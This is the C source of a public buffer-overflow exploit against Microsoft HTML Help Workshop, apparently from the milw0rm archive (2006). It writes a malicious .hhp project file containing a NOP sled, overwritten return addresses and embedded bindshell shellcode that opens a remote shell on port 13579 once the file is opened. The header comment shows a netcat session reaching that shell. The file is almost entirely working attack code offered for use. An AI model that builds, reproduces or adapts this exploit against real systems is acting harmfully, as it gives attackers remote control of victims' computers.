/*
Microsoft HTML Help Workshop .hhp file Buffer Overflow Exploit
by bratax (http://www.bratax.be/)

-> greets to:
all my miffm00f buddies, BuzzDee and everyone else I forgot who should be in here
-> thx to:
Curt Wilson @ SIUC (maybe you don't know why but this exploit wouldn't
exist if we didn't have that conversation a long long time ago)
nolimit & buzzdee (I used most of your realplayer .smil exploit code because I
didn't feel like writing this code from scratch :p)
-> special thx to:
duksie, dwarf & turb00 (you guys know why)

C:\htmlws>poc2
Microsoft HTML Help Workshop Buffer Overflow.
Coded by bratax (http://www.bratax.be/).
Usage: C:\htmlws\PoC2.exe <outputfile>

C:\htmlws>poc2 new.hhp
File written.
Open with Microsoft Help Workshop to exploit.

C:\htmlws>nc -vv localhost 13579
DNS fwd/rev mismatch: RENEE != localhost
RENEE [127.0.0.1] 13579 (?) open
Microsoft Windows XP [versie 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\htmlws>exit
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char pre[]=
"[OPTIONS]\n"
"Compatibility=1.1 or later\n"
"Compiled file=bratax.chm\n"
"Contents file=";

char end[]=
"Display compile progress=No\n"
"Language=0x813 Dutch (Belgium)\n\n\n"
"[INFOTYPES]";

char shellcode[]=
/* bindshell port 13579 thx to metasploit.com :) */
"\x29\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x8f"
"\x35\x37\x85\x83\xeb\xfc\xe2\xf4\x73\x5f\xdc\xca\x67\xcc\xc8\x7a"
"\x70\x55\xbc\xe9\xab\x11\xbc\xc0\xb3\xbe\x4b\x80\xf7\x34\xd8\x0e"
"\xc0\x2d\xbc\xda\xaf\x34\xdc\x66\xbf\x7c\xbc\xb1\x04\x34\xd9\xb4"
"\x4f\xac\x9b\x01\x4f\x41\x30\x44\x45\x38\x36\x47\x64\xc1\x0c\xd1"
"\xab\x1d\x42\x66\x04\x6a\x13\x84\x64\x53\xbc\x89\xc4\xbe\x68\x99"
"\x8e\xde\x34\xa9\x04\xbc\x5b\xa1\x93\x54\xf4\xb4\x4f\x51\xbc\xc5"
"\xbf\xbe\x77\x89\x04\x45\x2b\x28\x04\x75\x3f\xdb\xe7\xbb\x79\x8b"
"\x63\x65\xc8\x53\xbe\xee\x51\xd6\xe9\x5d\x04\xb7\xe7\x42\x44\xb7"
"\xd0\x61\xc8\x55\xe7\xfe\xda\x79\xb4\x65\xc8\x53\xd0\xbc\xd2\xe3"
"\x0e\xd8\x3f\x87\xda\x5f\x35\x7a\x5f\x5d\xee\x8c\x7a\x98\x60\x7a"
"\x59\x66\x64\xd6\xdc\x66\x74\xd6\xcc\x66\xc8\x55\xe9\x5d\x02\x8e"
"\xe9\x66\xbe\x64\x1a\x5d\x93\x9f\xff\xf2\x60\x7a\x59\x5f\x27\xd4"
"\xda\xca\xe7\xed\x2b\x98\x19\x6c\xd8\xca\xe1\xd6\xda\xca\xe7\xed"
"\x6a\x7c\xb1\xcc\xd8\xca\xe1\xd5\xdb\x61\x62\x7a\x5f\xa6\x5f\x62"
"\xf6\xf3\x4e\xd2\x70\xe3\x62\x7a\x5f\x53\x5d\xe1\xe9\x5d\x54\xe8"
"\x06\xd0\x5d\xd5\xd6\x1c\xfb\x0c\x68\x5f\x73\x0c\x6d\x04\xf7\x76"
"\x25\xcb\x75\xa8\x71\x77\x1b\x16\x02\x4f\x0f\x2e\x24\x9e\x5f\xf7"
"\x71\x86\x21\x7a\xfa\x71\xc8\x53\xd4\x62\x65\xd4\xde\x64\x5d\x84"
"\xde\x64\x62\xd4\x70\xe5\x5f\x28\x56\x30\xf9\xd6\x70\xe3\x5d\x7a"
"\x70\x02\xc8\x55\x04\x62\xcb\x06\x4b\x51\xc8\x53\xdd\xca\xe7\xed"
"\xf1\xed\xd5\xf6\xdc\xca\xe1\x7a\x5f\x35\x37\x85";



char overflow[15000];	// 15k just to make sure :)
int main(int argc,char *argv[])
{

	FILE *vuln;
	if(argc == 1)
	{
		printf("Microsoft HTML Help Workshop Buffer Overflow.\n");
		printf("Coded by bratax (http://www.bratax.be/).\n");
		printf("Usage: %s <outputfile>\n",argv[0]);
		return 0;
	}
	vuln = fopen(argv[1],"w");
	//build overflow buffer here.
	memset(overflow,0x90,sizeof(overflow)); //fill with nops
	memcpy(overflow+272,"\x5d\x38\x82\x7c",4); //EIP (jmp esp)  1 of these is
	memcpy(overflow+276,"\x5d\x38\x82\x7c",4); //EIP (jmp esp)  enough but was
	memcpy(overflow+280,"\x5d\x38\x82\x7c",4); //EIP (jmp esp)  a bit lazy to
	memcpy(overflow+284,"\x5d\x38\x82\x7c",4); //EIP (jmp esp)  find out the
	memcpy(overflow+288,"\x5d\x38\x82\x7c",4); //EIP (jmp esp)	correct one :p
	memcpy(overflow+292,"\x5d\x38\x82\x7c",4); //EIP (jmp esp)
   memcpy(overflow+300,shellcode,sizeof(shellcode)); //our shellcode after some nops to land in

	if(vuln)
	{
		//Write file
		fprintf(vuln,"%s%s\"/>\n%s",pre,overflow,end);
		fclose(vuln);
	}
	printf("File written.\nOpen with Microsoft Help Workshop to exploit.\n");
	return 0;
}

// milw0rm.com [2006-02-06]